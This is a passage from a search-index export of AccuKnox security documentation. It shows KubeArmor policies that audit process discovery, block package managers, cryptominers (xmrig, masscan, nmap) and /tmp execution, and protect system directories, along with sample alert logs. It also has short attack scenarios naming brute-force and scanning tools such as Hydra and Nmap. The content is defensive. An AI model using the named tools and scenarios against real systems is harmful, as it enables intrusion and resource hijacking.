<p>Update the Jira ticket with verification details.</p> </li> </ul>"},{"location":"use-cases/secret-scan-cicd-aws/#conclusion-stop-secrets-before-they-leak","title":"Conclusion: Stop Secrets Before They Leak","text":"<p>In today's fast-moving development pipelines, accidents happen. The difference between a minor issue and a $45,000 disaster is how fast you detect and remediate secret leaks. AccuKnox Secret Scanning integrates seamlessly into your GitHub Actions workflows to give you early, automated protection.</p>"},{"location":"use-cases/securing-you-cloud-infra-through-detecting-misconfiguration-and-vulnerabilities/","title":"Securing you cloud infra through detecting misconfiguration and vulnerabilities","text":"<p>SCHEDULE DEMO</p>"},{"location":"use-cases/subprompts-categories/","title":"Categories and Probes","text":""},{"location":"use-cases/use-case-cards/","title":"Use Cases","text":"<p>FIM</p><p>File Integrity Monitoring, Prevent write access to systems folders path. </p> <p>Packaging tools</p><p>Deny execution of package management tools. </p> <p>Account Token</p><p>Protect access to service account token</p> <p>Trusted cert bundle</p><p>Protect write access to the trusted root certificates bundle.</p> <p>Database access</p><p>Protect read/write access to raw database tables from unknown processes.</p> <p>Config data</p><p>Protect access to configuration data containing plain text credentials.</p> <p>File Copy</p><p>Prevent file copy using standard utilities.</p> <p>Network Access</p><p>Prevent network access to any processes or selectively enable network access to specific processes.</p> <p>/tmp/ noexec</p><p>Do not allow execution of binaries from /tmp/ folder.</p> <p>Admin tools</p><p>Do not allow execution of administrative/maintenance tools inside the pods.</p> <p>Discovery tools</p><p>Do not allow discovery/search of tools/configuration.</p> <p>Logs delete</p><p>Do not allow external tooling to delete logs/traces of critical components.</p> <p>ICMP control</p><p>Do not allow scanning tools to use ICMP for scanning the network.</p>"},{"location":"use-cases/vm-audit-log/","title":"Auditing &amp; Log Management","text":""},{"location":"use-cases/vm-audit-log/#overview","title":"Overview","text":"<p>AccuKnox shows Kubearmor logs under the alerts tab in our SaaS which can help to visualize the granular details to investigate an attack scenario. Let's take the below example -</p> <p>Attackers can use the <code>ps</code>, <code>pgrep</code>, <code>top</code>, and other commands to enumerate the running processes on a system. Then, using that data, they can filter and pinpoint crucial processes that could be the focus of an attack. KubeArmor can be set to audit the following process: <code>/bin/ps</code>, <code>/usr/bin/ps</code>, <code>/usr/bin/pgrep</code>, <code>/usr/bin/top</code>, and <code>/usr/bin/htop</code> by using the below policy.</p>"},{"location":"use-cases/vm-audit-log/#active-policy","title":"Active Policy","text":"<pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorHostPolicy\nmetadata:\n  name: ksp-discovery-process-discovery\nspec:\n  severity: 5\n  tags:\n  - MITRE\n  - Discovery\n  message: Someone accessed running process\n  nodeSelector:\n    matchLabels:\n      kubearmor.io/hostname: ubuntu-2gb-hel1-1\n  action: Audit\n  process:\n    matchPaths:\n    - path: /bin/ps\n    - path: /usr/bin/ps\n    - path: /usr/bin/pgrep\n    - path: /usr/bin/top\n    - path: /usr/bin/htop\n</code></pre> <p>This will allow KubeArmor to detect suspicious activities involving these tools, such as attempts to enumerate or exploit running processes. We can further investigate the attack by using the alert history from the SaaS.</p> <p>Telemetry data is generated in Alerts when using the ps command.</p> <pre><code>$ ps\n    PID TTY          TIME CMD\n 130025 pts/1    00:00:00 bash\n 130034 pts/1    00:00:00 ps\n</code></pre> <p>Users can view the detailed logs of every process execution, File accessed, and Network connection by Navigating to AccuKnox Saas &gt; Monitors/Alerts &gt; Alerts</p> <p></p>"},{"location":"use-cases/vm-audit-log/#kubearmor-logs","title":"Kubearmor logs","text":"<pre><code>{\n\"Action\":\"Audit\"\n\"ClusterName\":\"wsl-ubuntu\"\n\"Cwd\":\"/root/\"\n\"Data\":\"syscall=SYS_EXECVE\"\n\"Enforcer\":\"eBPF Monitor\"\n\"HostName\":\"ubuntu-2gb-hel1-2\"\n\"HostPID\":130034\n\"HostPPID\":130025\n\"Message\":\"Someone accessed running process\"\n\"Operation\":\"Process\"\n\"PID\":130034\n\"PPID\":0\n\"ParentProcessName\":\"/usr/bin/bash\"\n\"PolicyName\":\"discovery-process-discovery\"\n\"ProcessName\":\"/usr/bin/ps\"\n\"Resource\":\"/usr/bin/ps\"\n\"Result\":\"Passed\"\n\"Severity\":\"5\"\n\"Source\":\"/usr/bin/bash\"\n\"TTY\":\"pts1\"\n\"Tags\":\"MITRE,Discovery\"\n\"Timestamp\":1717156232\n\"Type\":\"MatchedHostPolicy\"\n\"UID\":0\n\"cluster_id\":\"27273\"\n\"component_name\":\"kubearmor\"\n\"instanceGroup\":\"0\"\n\"instanceID\":\"0\"\n\"workload\":\"1\"\n}\n</code></pre>"},{"location":"use-cases/vm-audit-log/#more-examples","title":"More Examples","text":""},{"location":"use-cases/vm-audit-log/#process-getting-executed-in-vm","title":"Process getting executed in VM","text":"<pre><code>{\n\"Action\":\"Block\"\n\"ClusterName\":\"wsl-ubuntu\"\n\"Cwd\":\"/root/\"\n\"Data\":\"syscall=SYS_EXECVE\"\n\"Enforcer\":\"AppArmor\"\n\"HostName\":\"ubuntu-2gb-hel1-1\"\n\"HostPID\":15117\n\"HostPPID\":15043\n\"Message\":\"apt was attempted to be executed\"\n\"Operation\":\"Process\"\n\"PID\":15117\n\"PPID\":0\n\"ParentProcessName\":\"/usr/bin/bash\"\n\"PolicyName\":\"block-pkg-mgmt-tools\"\n\"ProcessName\":\"/usr/bin/apt\"\n\"Resource\":\"/usr/bin/apt\"\n\"Result\":\"Permission denied\"\n\"Severity\":\"10\"\n\"Source\":\"/usr/bin/bash\"\n\"TTY\":\"pts2\"\n\"Tags\":\"NIST,NIST_800-53_CM-7(4),SI-4,process,NIST_800-53_SI-4\"\n\"Timestamp\":1716918832\n\"Type\":\"MatchedHostPolicy\"\n\"UID\":0\n\"cluster_id\":\"27273\"\n\"component_name\":\"kubearmor\"\n\"instanceGroup\":\"0\"\n\"instanceID\":\"0\"\n\"workload\":\"1\"\n}\n</code></pre>"},{"location":"use-cases/vm-audit-log/#file-accessed-in-vm","title":"File accessed in VM","text":"<pre><code>{\n\"Action\":\"Block\"\n\"ClusterName\":\"wsl-ubuntu\"\n\"ContainerID\":\"013ea36d4d47dd15521795cacb4a638b38e3ab5d62b6b917f4dc14c8d9591f55\"\n\"ContainerImage\":\"ubuntu:20.04\"\n\"ContainerName\":\"ubuntu\"\n\"Cwd\":\"/\"\n\"Data\":\"syscall=SYS_OPENAT fd=-100 flags=O_WRONLY|O_CREAT|O_NOCTTY|O_NONBLOCK\"\n\"Enforcer\":\"AppArmor\"\n\"HostName\":\"ubuntu-2gb-hel1-2\"\n\"HostPID\":129898\n\"HostPPID\":129853\n\"Labels\":\"org.opencontainers.image.ref.name=ubuntu,org.opencontainers.image.vers...\"\n\"Message\":\"Detected and prevented compromise to File integrity\"\n\"NamespaceName\":\"container_namespace\"\n\"Operation\":\"File\"\n\"PID\":12\n\"PPID\":1\n\"ParentProcessName\":\"/usr/bin/bash\"\n\"PodName\":\"ubuntu\"\n\"PolicyName\":\"file-integrity-monitoring\"\n\"ProcessName\":\"/usr/bin/touch\"\n\"Resource\":\"/usr/lib/test_file\"\n\"Result\":\"Permission denied\"\n\"Severity\":\"1\"\n\"Source\":\"/usr/bin/touch /usr/lib/test_file\"\n\"TTY\":\"pts0\"\n\"Tags\":\"NIST,NIST_800-53_AU-2,NIST_800-53_SI-4,MITRE,MITRE_T1036_masquerading,...\"\n\"Timestamp\":1717155559\n\"Type\":\"MatchedPolicy\"\n\"UID\":0\n\"cluster_id\":\"27273\"\n\"component_name\":\"kubearmor\"\n\"instanceGroup\":\"0\"\n\"instanceID\":\"0\"\n\"workload\":\"1\"\n}\n</code></pre> <p>On the <code>Alerts</code> page, we can filter the logs using different parameters e.g. Message, ClusterName, Action, Severity, Operation, Pod Name, ContainerID, Enforcer, PID, HostName, etc and this can also be forwarded to the integrated SIEM tools for further analysis.</p>"},{"location":"use-cases/vm-aws/","title":"VM Security Misconfigurations on AWS","text":""},{"location":"use-cases/vm-aws/#iam-security","title":"IAM Security","text":"<p>One common IAM misconfiguration is the use of weak passwords or lack of multi-factor authentication (MFA) for critical user accounts. Without strong credentials and MFA in place, attackers can easily compromise IAM accounts, gaining unauthorized access to sensitive AWS resources. This highlights the importance of enforcing robust password policies and enabling MFA for all users with access to critical infrastructure.</p>"},{"location":"use-cases/vm-aws/#why-weak-iam-credentials-are-a-risk","title":"Why Weak IAM Credentials are a Risk","text":"<p>When IAM credentials are weak, attackers can easily exploit them to gain unauthorized access to AWS resources. This opens the door to various security threats, including:</p> <ul> <li> <p>Unauthorized Access: Weak passwords or improper credential management can allow attackers to gain control of critical resources.</p> </li> <li> <p>Privilege Escalation: Attackers can leverage weak credentials to escalate privileges and gain broader access within the AWS environment.</p> </li> <li> <p>Data Breaches: Attackers exploiting weak IAM credentials can access, steal, or manipulate sensitive data, resulting in significant operational and financial damage.</p> </li> </ul>"},{"location":"use-cases/vm-aws/#attack-scenario","title":"Attack Scenario","text":"<p>An attacker scans for weak IAM credentials and attempts to brute-force passwords using tools like Hydra. If the password is weak or default, the attacker can gain unauthorized access to the AWS environment. Once inside, they could escalate privileges to access more sensitive resources or launch attacks, such as data exfiltration or manipulation.</p>"},{"location":"use-cases/vm-aws/#how-to-identify-and-remediate-weak-iam-credentials-with-accuknox","title":"How to Identify and Remediate Weak IAM Credentials with AccuKnox","text":"<ol> <li> <p>Navigate to Findings: Go to the AccuKnox portal and access <code>Issues &gt; Findings</code>.</p> </li> <li> <p>Apply Filters: Use the cloud findings filter and search for the keyword password to list relevant findings.</p> </li> <li> <p>Review Findings: Assess the severity of findings related to weak credentials, including lack of multi-factor authentication (MFA) or poor password complexity requirements.</p> </li> <li> <p>Take Action: Follow the remediation guidance provided within the platform to enforce strong IAM credentials and ensure MFA is enabled.</p> </li> </ol> <p></p>"},{"location":"use-cases/vm-aws/#remediation-steps","title":"Remediation Steps","text":"<ol> <li> <p>Navigate to Issues &gt; Findings in the AccuKnox portal.</p> </li> <li> <p>Select the finding related to weak IAM credentials or non-compliance with password policies.</p> </li> <li> <p>Create a ticket to track the remediation process.</p> </li> <li> <p>Follow recommended steps and security references linked within the findings to strengthen IAM credential security, including implementing MFA and enforcing complex password policies.</p> </li> </ol> <p></p>"},{"location":"use-cases/vm-aws/#best-practices-to-avoid-weak-iam-credential-risks","title":"Best Practices to Avoid Weak IAM Credential Risks","text":"<ul> <li> <p>Enforce Strong Password Policies: Ensure that IAM users follow strict password length, complexity, and expiration rules.</p> </li> <li> <p>Enable MFA: Require multi-factor authentication for all IAM users and accounts.</p> </li> <li> <p>Regularly Audit IAM Permissions: Continuously review and audit IAM user roles and permissions to ensure least-privilege access.</p> </li> <li> <p>Monitor IAM Security Continuously: Use AccuKnox CSPM to monitor IAM configurations for real-time detection and remediation of misconfigurations.</p> </li> </ul> <p>By proactively addressing weak IAM credentials and following best practices, you can significantly reduce the risk of unauthorized access and maintain a secure AWS environment.</p>"},{"location":"use-cases/vm-aws/#network-security","title":"Network Security","text":"<p>One major security challenge with AWS Network Security is the exposure of Open SSH ports. Misconfigurations in security group settings or improperly secured SSH access can allow attackers to exploit these open ports, potentially gaining unauthorized access to critical systems. It is essential to address these vulnerabilities proactively to safeguard your environment from brute force attacks, unauthorized access, and lateral movement within your network.</p>"},{"location":"use-cases/vm-aws/#why-open-ssh-ports-are-a-risk","title":"Why Open SSH Ports are a Risk","text":"<p>When SSH ports are publicly exposed, attackers can exploit them to:</p> <ul> <li> <p>Brute Force Attacks: Attackers use tools to guess SSH credentials, gaining unauthorized access.</p> </li> <li> <p>Resource Hijacking: Compromised machines can be used for malicious activities like crypto mining or botnets.</p> </li> <li> <p>Lateral Movement: Once inside, attackers can move laterally within your environment to access more systems.</p> </li> </ul>"},{"location":"use-cases/vm-aws/#attack-scenario_1","title":"Attack Scenario","text":"<p>An attacker scans for publicly exposed SSH ports using tools like Nmap or Shodan. If the SSH configuration lacks strong authentication, they launch brute-force attacks using tools like Hydra or Medusa to crack credentials. Once successful, the attacker gains control over the EC2 instance, compromising its resources and potentially infiltrating the entire network.</p> <p></p>"},{"location":"use-cases/vm-aws/#how-to-identify-and-remediate-open-ssh-ports-with-accuknox","title":"How to Identify and Remediate Open SSH Ports with AccuKnox","text":"<ol> <li> <p>Navigate to Findings: Go to the AccuKnox portal and access Issues &gt; Findings.</p> </li> <li> <p>Apply Filters: Use the Cloud Findings filter and search for the keyword \"ssh\" to locate findings related to open SSH ports.</p> </li> <li> <p>Group Findings: Group the findings to identify all publicly exposed SSH ports for efficient analysis.</p> </li> <li> <p>Review Findings Analyze the severity of each finding and assess the potential risk</p> </li> </ol> <p></p>"},{"location":"use-cases/vm-aws/#remediation-steps_1","title":"Remediation Steps","text":"<ol> <li> <p>Identify Open SSH Ports: Select the findings related to publicly exposed SSH ports.</p> </li> <li> <p>Create a Ticket: Create a ticket to track the resolution process.</p> </li> <li> <p>Follow Guidance: Follow the recommended security steps provided within the platform to restrict access to SSH ports.</p> </li> <li> <p>Verify Configuration: Ensure that SSH ports are no longer publicly accessible and have strong authentication mechanisms enabled.</p> </li> </ol> <p></p>"},{"location":"use-cases/vm-aws/#best-practices-to-avoid-open-ssh-port-risks","title":"Best Practices to Avoid Open SSH Port Risks","text":"<ul> <li> <p>Restrict SSH access to trusted IP addresses using security groups.</p> </li> <li> <p>Use key-based authentication instead of passwords to secure SSH access.</p> </li> <li> <p>Monitor SSH login attempts and set up fail2ban or similar tools to prevent brute-force attacks.</p> </li> <li> <p>Continuously monitor your environment with AccuKnox CSPM for real-time detection and remediation of misconfigurations.</p> </li> </ul>"},{"location":"use-cases/vm-aws/#disk-security","title":"Disk Security","text":"<p>A common misconfiguration in cloud environments is the use of unencrypted Elastic Block Store (EBS) volumes. EBS volumes that lack encryption expose sensitive data to unauthorized access if compromised. This issue underscores the necessity of encrypting EBS volumes to protect data at rest.</p>"},{"location":"use-cases/vm-aws/#why-unencrypted-ebs-volumes-are-a-risk","title":"Why Unencrypted EBS Volumes are a Risk","text":"<p>Unencrypted EBS volumes pose several security risks:</p> <ul> <li> <p>Data Exposure: Data stored in unencrypted volumes is accessible in plaintext, increasing the likelihood of data leaks in case of unauthorized access.</p> </li> <li> <p>Regulatory Non-Compliance: Many compliance frameworks mandate encryption of data at rest, and unencrypted volumes can result in non-compliance penalties.</p> </li> <li> <p>Increased Attack Surface: Without encryption, attackers gaining access to snapshots or backups can easily read sensitive data.</p> </li> </ul>"},{"location":"use-cases/vm-aws/#attack-scenario_2","title":"Attack Scenario","text":"<p>An attacker gains access to an AWS account due to compromised credentials. They identify an unencrypted EBS volume attached to an EC2 instance hosting sensitive data. The attacker creates a snapshot of the volume and exports it to another region or account, where they access the plaintext data, leading to a data breach.</p> <p></p>"},{"location":"use-cases/vm-aws/#how-to-identify-and-remediate-unencrypted-ebs-volumes-with-accuknox","title":"How to Identify and Remediate Unencrypted EBS Volumes with AccuKnox","text":"<ol> <li> <p>Navigate to Findings: Log in to the AccuKnox portal and access the Issues &gt; Findings section.</p> </li> <li> <p>Apply Filters: Use the cloud findings filter and search for the keyword <code>EBS encryption</code> to identify non-compliant volumes.</p> </li> <li> <p>Review Findings: Assess the severity of findings related to unencrypted EBS volumes, including details about the impacted resources.</p> </li> <li> <p>Take Action: Follow the remediation guidance within the platform to enable encryption for all EBS volumes.</p> </li> </ol> <p></p>"},{"location":"use-cases/vm-aws/#remediation-steps_2","title":"Remediation Steps","text":"<ol> <li> <p>Identify Unencrypted EBS Volume: Select the findings related to Unencrypted EBS Volume.</p> </li> <li> <p>Create a Ticket: Create a ticket to track the resolution process.</p> </li> <li> <p>Follow Guidance: Follow the recommended security steps provided within the platform to Encrypted EBS Volume</p> </li> <li> <p>Verify Configuration: Ensure that EBS Volume are no longer unencrypted.</p> </li> </ol> <p></p>"},{"location":"use-cases/vm-aws/#best-practices-to-avoid-unencrypted-ebs-volume-risks","title":"Best Practices to Avoid Unencrypted EBS Volume Risks","text":"<ul> <li> <p>Enable Default Encryption: Configure default encryption for EBS volumes in each AWS region.</p> </li> <li> <p>Monitor Continuously: Use tools like AccuKnox CSPM to detect and remediate unencrypted volumes in real-time.</p> </li> <li> <p>Automate Compliance: Employ AWS Config rules or security automation to enforce encryption standards.</p> </li> <li> <p>Regular Audits: Periodically review your EBS volumes and snapshots to ensure compliance with encryption policies.</p> </li> </ul> <p>By addressing the risk of unencrypted EBS volumes and adhering to best practices, you can safeguard sensitive data and maintain a secure cloud environment.</p>"},{"location":"use-cases/vm-azure/","title":"VM Security Misconfigurations on Azure","text":""},{"location":"use-cases/vm-azure/#network-security","title":"Network Security","text":"<p>As organizations increasingly adopt cloud services, securing their cloud networks is essential. In Azure, misconfigurations in network security settings can lead to significant security risks. Publicly exposed network ports, misconfigured security groups, or open firewall rules can all serve as entry points for attackers. Ensuring a robust Azure Network Security posture is crucial for protecting resources, preventing unauthorized access, and ensuring the overall security of cloud applications.</p>"},{"location":"use-cases/vm-azure/#attack-scenario","title":"Attack Scenario","text":"<p>Azure Network Security misconfigurations present various vulnerabilities. Below are some common issues:</p> <ol> <li>Exposed RDP Ports: Leaving Remote Desktop Protocol (RDP) ports (default port 3389) open in Azure Network Security Groups (NSGs) increases the risk of brute-force attacks, unauthorized entry, and malware deployment.</li> </ol>"},{"location":"use-cases/vm-azure/#how-to-identify-and-remediate-open-rdp-ports-in-azure-nsgs","title":"How to Identify and Remediate Open RDP Ports in Azure NSGs","text":"<ol> <li> <p>Navigate to Findings: Go to the AccuKnox portal and access <code>Issues &gt; Findings</code>.</p> </li> <li> <p>Apply Filters: Use the cloud findings filter and search for the keyword RDP to list relevant findings.</p> </li> <li> <p>Review Findings: Analyze identified Open RDP access and assess the associated risk severity.</p> </li> <li> <p>Take Action: Follow the remediation guidance provided within the platform</p> </li> </ol> <p></p>"},{"location":"use-cases/vm-azure/#remediation-steps","title":"Remediation Steps","text":"<ol> <li> <p>Navigate to <code>Issues &gt; Findings</code> in the AccuKnox portal.</p> </li> <li> <p>Select the finding related to Open RDP</p> </li> <li> <p>Create a ticket to track the resolution process.</p> </li> <li> <p>Follow the recommended steps and security references linked within the findings for precise remediation.</p> </li> </ol> <p></p>"},{"location":"use-cases/vm-azure/#best-practices","title":"Best Practices","text":"<ul> <li> <p>Avoid exposing RDP ports directly to the public internet; use VPNs or Azure Bastion for secure access.</p> </li> <li> <p>Regularly audit NSG rules to identify and remove unnecessary open ports.</p> </li> <li> <p>Monitor all port configurations using AccuKnox CSPM for real-time detection and remediation.</p> </li> </ul>"},{"location":"use-cases/vm-azure/#storage-security","title":"Storage Security","text":""},{"location":"use-cases/vm-azure/#publicly-exposed-vm-disks","title":"Publicly exposed VM disks","text":"<p>One major security challenge with Azure VMs lies in publicly exposed VM disks. These misconfigurations can leave sensitive data vulnerable to exploitation, making it essential to address them proactively.</p>"},{"location":"use-cases/vm-azure/#why-is-vm-disk-public-access-a-risk","title":"Why is VM Disk Public Access a Risk","text":"<p>When a VM disk is publicly exposed, it becomes a target for malicious attackers. Unauthorized access can lead to:</p> <ul> <li> <p>Data Exposure: Sensitive data can be copied or leaked.</p> </li> <li> <p>Malicious Modifications: Attackers may alter files, plant malware, or tamper with critical system configurations.</p> </li> <li> <p>Compliance Violations: Exposure violates compliance standards like GDPR, HIPAA, or ISO, leading to potential legal and financial repercussions.</p> </li> </ul>"},{"location":"use-cases/vm-azure/#attack-scenario_1","title":"Attack Scenario","text":"<p>An attacker uses scanning tools to scan the Internet for publicly accessible VM disks. Upon finding a vulnerable disk, they gain access, exfiltrate sensitive data, or plant malicious files. This can result in data breaches, operational disruptions, or financial losses.</p> <p></p>"},{"location":"use-cases/vm-azure/#how-to-identify-and-remediate-vm-disk-public-access-with-accuknox","title":"How to Identify and Remediate VM Disk Public Access with AccuKnox","text":"<ol> <li> <p>Navigate to Findings: Go to the AccuKnox portal and access <code>Issues &gt; Findings</code>.</p> </li> <li> <p>Apply Filters: Use the cloud findings filter and search for the keyword vm disk to list relevant findings.</p> </li> <li> <p>Review Findings: Analyze identified public VM disk access and assess the associated risk severity.</p> </li> <li> <p>Take Action: Follow the remediation guidance provided within the platform to secure exposed disks.</p> </li> </ol> <p></p>"},{"location":"use-cases/vm-azure/#remediation-steps_1","title":"Remediation Steps","text":"<ol> <li> <p>Navigate to <code>Issues &gt; Findings</code> in the AccuKnox portal.</p> </li> <li> <p>Select the finding related to VM Disk Public Access.</p> </li> <li> <p>Create a ticket to track the resolution process.</p> </li> <li> <p>Follow the recommended steps and security references linked within the findings for precise remediation.</p> </li> </ol> <p></p>"},{"location":"use-cases/vm-azure/#best-practices-to-avoid-vm-disk-public-access","title":"Best Practices to Avoid VM Disk Public Access","text":"<ul> <li> <p>Regularly audit VM disk permissions and ensure they are not publicly accessible.</p> </li> <li> <p>Apply least-privilege access principles to restrict disk access.</p> </li> <li> <p>Monitor your cloud environment continuously using AccuKnox CSPM for real-time detection of misconfiguration</p> </li> </ul> <p>-</p>"},{"location":"use-cases/vm-blocking-package-managers/","title":"Use Case: Blocking Execution of Package Managers","text":""},{"location":"use-cases/vm-blocking-package-managers/#purpose","title":"Purpose","text":"<p>Attackers might attempt to download additional tools or downgrade packages to a vulnerable version. Blocking the execution of package managers enhances security by preventing such actions. Commonly targeted package managers include <code>apt</code>, <code>yum</code>, <code>dnf</code>, and <code>pip</code>.</p>"},{"location":"use-cases/vm-blocking-package-managers/#steps-to-implement","title":"Steps to Implement","text":"<ol> <li> <p>Replace <code>&lt;vm-hostname&gt;</code> with the target VM's hostname in the policy configuration.</p> </li> <li> <p>Define paths to target specific package managers.</p> </li> </ol> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorHostPolicy\nmetadata:\n  name: block-pkg-mgmt-tools\nspec:\n  severity: 10\n  message: \"Alert! Execution of package management process is denied\"\n  nodeSelector:\n    matchLabels:\n      kubearmor.io/hostname: &lt;vm-hostname&gt;\n  process:\n   matchPaths:\n    - execname: apt-get\n    - execname: apt\n    - execname: dnf\n    - execname: dpkg\n    - execname: gdebi\n    - execname: make\n    - execname: makepkg\n    - execname: pacman\n    - execname: rpm\n    - execname: yaourt\n    - execname: yum\n    - execname: zypper\n\n  action:\n    Block\n  tags:\n   - NIST\n   - NIST_800-53_CM-7(4)\n   - SI-4\n   - process\n   - NIST_800-53_SI-4\n</code></pre> <ol> <li>Upload and activate the policy to block the execution of package managers on the VM. </li> </ol> <p></p>"},{"location":"use-cases/vm-blocking-package-managers/#expected-outcome","title":"Expected Outcome","text":"<ul> <li> <p>Package manager execution attempts are blocked.</p> </li> <li> <p>Alerts are logged and visible in the SaaS platform's \"Policy Violations\" section.</p> </li> </ul>"},{"location":"use-cases/vm-blocking-package-managers/#scenario","title":"Scenario","text":"<p>An attacker attempts to use <code>apt</code> to install a malicious package. The execution is blocked, and an alert is generated for the security team to investigate.</p>"},{"location":"use-cases/vm-blocking-package-managers/#verification-steps","title":"Verification Steps","text":"<ol> <li> <p>Open a new terminal session on the VM.</p> </li> <li> <p>Try executing a blocked package manager command. </p> </li> <li> <p>Confirm:</p> <ul> <li> <p>Execution is blocked.</p> </li> <li> <p>Alert details are displayed on the SaaS platform. </p> </li> </ul> </li> </ol>"},{"location":"use-cases/vm-compliance-benchmarking/","title":"Compliance Benchmarking and Risk Assessment","text":""},{"location":"use-cases/vm-compliance-benchmarking/#overview","title":"Overview","text":"<p>CWPP supports compliance benchmarking for VM as a part of VM security to ensure components within VMs adhere to regulatory compliance like CIS and STIGs.</p>"},{"location":"use-cases/vm-compliance-benchmarking/#benefits-of-compliance-in-vms","title":"Benefits of Compliance in VMs","text":"<ul> <li> <p>Risk Reduction: Minimizes exposure to vulnerabilities and attacks.</p> </li> <li> <p>Regulatory Adherence: Avoids fines and penalties for non-compliance.</p> </li> <li> <p>Improved Security Posture: Strengthens defenses against cyber threats.</p> </li> <li> <p>Operational Efficiency: Streamlines auditing and reporting processes.</p> </li> </ul> <p>AccuKnox provides CIS and STIG benchmark checks for VMs to assist users in maintaining a good security and compliance posture</p>"},{"location":"use-cases/vm-compliance-benchmarking/#pre-requisite","title":"Pre-requisite","text":"<ol> <li> <p>Install Knoxctl</p> </li> <li> <p>Create Label</p> </li> <li> <p>Create Token or Access Keys</p> </li> <li> <p>Tenant id</p> </li> </ol>"},{"location":"use-cases/vm-compliance-benchmarking/#steps","title":"Steps","text":"<ol> <li> <p>Navigate to Settings &gt; ManageCluster on AccuKnox Saas</p> </li> <li> <p>Click on Onboard Now and Select Cluster Type as VM</p> </li> <li> <p>Enter Cluster/VM Name and click on Save &amp; Next</p> </li> <li> <p>Choose STIG from the option shown on UI and follow the instruction on UI to install VM Scanner using Knoxctl</p> </li> </ol> <p></p> <p>Once the VM Scanner is installed, It will perform the checks based on the cron schedule and Users can see the findings on AccuKnox Saas</p>"},{"location":"use-cases/vm-compliance-benchmarking/#findings","title":"Findings","text":"<ol> <li>Navigate to Issues &gt; Findings and Select STIG from the findings type filter</li> </ol> <ol> <li>Click on any of the findings to view the details</li> </ol> <p>Users can create a ticket for the remediation manually or by using the rule engine, and then automate the ticketing.</p>"},{"location":"use-cases/vm-crypto-miners/","title":"Preventing Cryptominers Execution","text":""},{"location":"use-cases/vm-crypto-miners/#purpose","title":"Purpose","text":"<p>AccuKnox is designed to prevent the execution of known cryptominers, block unauthorized binaries from running in the /tmp directory, and protect sensitive files from tampering, thereby mitigating cryptojacking threats that can lead to resource depletion and unauthorized data exposure.</p>"},{"location":"use-cases/vm-crypto-miners/#steps","title":"Steps","text":"<ol> <li> <p>Replace <code>&lt;vm-hostname&gt;</code> with the target VM's hostname in the policy configuration.</p> </li> <li> <p>Upload and activate the policy to:</p> <ul> <li> <p>Block execution of known cryptominer binaries, such as <code>xmrig</code>, <code>dero-miner-linux-amd64</code>, <code>masscan</code>, and <code>zgrab2</code>.</p> </li> <li> <p>Prevent execution of any binaries from the <code>/tmp</code> directory.</p> </li> <li> <p>Protect sensitive files and directories from tampering, including <code>/bin/</code>, <code>/usr/bin/</code>, and <code>/var/local/bin/</code>.</p> </li> </ul> </li> </ol> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorHostPolicy\nmetadata:\n  name: harden-crypto-miners\nSpec:\n  nodeSelector:\n    matchLabels:\n      kubearmor.io/hostname: vm-name\n  action: Block\n  file:\n    matchDirectories:\n    - dir: /bin/\n      readOnly: true\n      recursive: true\n    - dir: /boot/\n      readOnly: true\n      recursive: true\n    - dir: /sbin/\n      readOnly: true\n      recursive: true\n    - dir: /usr/bin/\n      readOnly: true\n      recursive: true\n    - dir: /usr/local/bin/\n      readOnly: true\n      recursive: true\n    - dir: /var/local/bin/\n      readOnly: true\n      recursive: true\n  message: cryptominer detected and blocked\n  process:\n    matchDirectories:\n    - dir: /tmp/\n      recursive: true\n    matchPaths:\n    - execname: apk\n    - execname: apt\n    - execname: dero-miner-linux-amd64\n    - execname: dero-wallet-cli-linux-amd64\n    - execname: dero\n    - execname: derod-linux-amd64\n    - execname: masscan\n    - execname: nmap\n    - execname: ntpdate\n    - execname: xmrig\n    - execname: zgrab2\n  severity: 10\n</code></pre>"},{"location":"use-cases/vm-crypto-miners/#protected-directories-and-actions","title":"Protected Directories and Actions","text":"<ul> <li> <p>Critical Directories (Read-Only Mode):</p> <ul> <li> <p><code>/bin/</code></p> </li> <li> <p><code>/boot/</code></p> </li> <li> <p><code>/sbin/</code></p> </li> <li> <p><code>/usr/bin/</code></p> </li> <li> <p><code>/usr/local/bin/</code></p> </li> <li> <p><code>/var/local/bin/</code></p> </li> </ul> </li> <li> <p>Blocked Processes:</p> <ul> <li> <p>Execution of binaries in <code>/tmp/</code>.</p> </li> <li> <p>Execution of cryptominer binaries, including:</p> <ul> <li> <p><code>apk</code></p> </li> <li> <p><code>apt</code></p> </li> <li> <p><code>dero-miner-linux-amd64</code></p> </li> <li> <p><code>xmrig</code></p> </li> <li> <p><code>masscan</code></p> </li> <li> <p><code>zgrab2</code></p> </li> </ul> </li> </ul> </li> </ul>"},{"location":"use-cases/vm-crypto-miners/#scenario","title":"Scenario","text":"<p>Imagine an attacker deploys a cryptomining binary like <code>xmrig</code> in the <code>/tmp/</code> directory. The policy will immediately block the execution and generate an alert with severity 10 on the SaaS platform.</p>"},{"location":"use-cases/vm-crypto-miners/#verification","title":"Verification","text":"<ol> <li> <p>Open a new terminal session on the VM.</p> </li> <li> <p>Try tampering the files in /bin/ directory or executing a blocked process</p> </li> <li> <p>Confirm that:</p> <ul> <li> <p>Actions are blocked.</p> </li> <li> <p>Alerts with severity 10 are visible on the SaaS platform, displaying specific details about the attempted action and the policy triggered.</p> </li> </ul> </li> </ol> <p></p> <p></p>"},{"location":"use-cases/vm-file-integrity/","title":"Use Case: File Integrity Monitoring","text":""},{"location":"use-cases/vm-file-integrity/#purpose","title":"Purpose","text":"<p>To safeguard critical system paths, such as binaries, configuration files, and credential directories, from unauthorized modifications, ensuring system integrity.</p> <p>AccuKnox actively monitors and blocks unauthorized changes to these critical system paths, protecting against any alterations that could compromise system integrity.</p>"},{"location":"use-cases/vm-file-integrity/#steps-to-implement","title":"Steps to Implement","text":"<ol> <li> <p>Replace <code>&lt;vm-hostname&gt;</code> with the target VM's hostname in the policy configuration.</p> </li> <li> <p>Specify directories and files to protect.</p> </li> </ol> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorHostPolicy\nmetadata:\n  name: hsp-File-Integrity-Monitoring\nspec:\n  nodeSelector:\n    matchLabels:\n      kubernetes.io/hostname: vm-name\n  severity: 5\n  message: Detected and prevented compromise to File integrity\n  File:\n    matchDirectories:\n     - dir: /sbin/\n       readOnly: true\n       recursive: true\n     - dir: /usr/bin/\n       readOnly: true\n       recursive: true\n     - dir: /usr/lib/\n       readOnly: true\n       recursive: true\n     - dir: /usr/sbin/\n       readOnly: 